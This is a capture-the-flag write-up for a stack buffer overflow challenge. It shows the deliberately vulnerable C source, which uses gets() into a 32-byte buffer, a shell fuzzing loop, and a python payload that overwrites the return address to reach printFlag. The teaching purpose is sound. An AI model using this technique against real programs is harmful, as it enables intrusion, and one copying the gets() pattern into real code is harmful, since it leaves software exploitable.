# Binary Exploitation

Challenge Name : Advance Overflow

# Solution

Let's review the source code first

```c++
#include <stdio.h>                                                                                                                                                                              
#include <stdlib.h>                                                                                                                                                                             
#include <string.h>                                                                                                                                                                             
#include <unistd.h>                                                                                                                                                                             
#include <sys/types.h>                                                                                                                                                                          
                                                                                                                                                                                                
#define BUFSIZE 32                                                                                                                                                                              
#define FLAGSIZE 128                                                                                                                                                                            
                                                                                                                                                                                                
void printFlag() {                                                                                                                                                                              
  char buf[FLAGSIZE];                                                                                                                                                                           
  FILE *f = fopen("flag.txt","r");                                                                                                                                                              
  fgets(buf,FLAGSIZE,f);                                                                                                                                                                        
  printf("Congrats!\nYou deserve your flag: %s",buf);                                                                                                                                           
}                                                                                                                                                                                               
                                                                                                                                                                                                
void vuln(){                                                                                                                                                                                    
  char buf[BUFSIZE];                                                                                                                                                                            
  gets(buf);                                                                                                                                                                                    
  printf("Going to address 0x%x\n",__builtin_return_address(0));                                                                                                                                
}                                                                                                                                                                                               
                                                                                                                                                                                                
int main(int argc, char **argv){                                                                                                                                                                
  setvbuf(stdout, NULL, _IONBF, 0);                                                                                                                                                             
  gid_t gid = getegid();                                                                                                                                                                        
  setresgid(gid, gid, gid);                                                                                                                                                                     
  printf("Welcome to the third challenge!\n");                                                                                                                                                  
  puts("In last challenge, you overflow a variable become 0xdeadbeef");                                                                                                                         
  puts("In this challenge, you have to overflow return address become the address at printFlag!");                                                                                              
  printf("The printFlag function address is at 0x%x\n",  __builtin_extract_return_addr(printFlag));                                                                                             
  puts("Overflow me to go to the printFlag function!");                                                                                                                                         
  printf("\nPayload: ");                                                                                                                                                                        
  vuln();                                                                                                                                                                                       
  printf("Your payload is not loooooong enough\n");                                                                                                                                             
  printf("You failed =(\n");                                                                                                                                                                    
  return 0;                                                                                                                                                                                     
}
```

We know that it will always retrun the function address for **printFlag** . We can use that information to make sure our payload will go to that address. Let's try run the program itself.

```bash
gcc overflow3.c -o overflow3 -fno-stack-protector
```

![[Pasted image 20210630181648.png]]

I love to automate stuff haha. Let's try fuzzing it.

```bash
for i in {1..50};do echo "Length Payload : " $i;echo;python3 -c "print('a' * $i)" | ./overflow3 ;done
```

We can see the different with having payload length of 40 and 41.

![[Pasted image 20210630181959.png]]

Which mean that we can do 40 and another 4 bytes which is the address for printFlag. But might be my computer and host computer is a bit different . So you can implement the same technique as long we can play around with the address.

```bash
python3 -c "print('a' * 39 + '\x92\x11\x40' )" | ./overflow3
```

# Flag

![[Pasted image 20210630183434.png]]


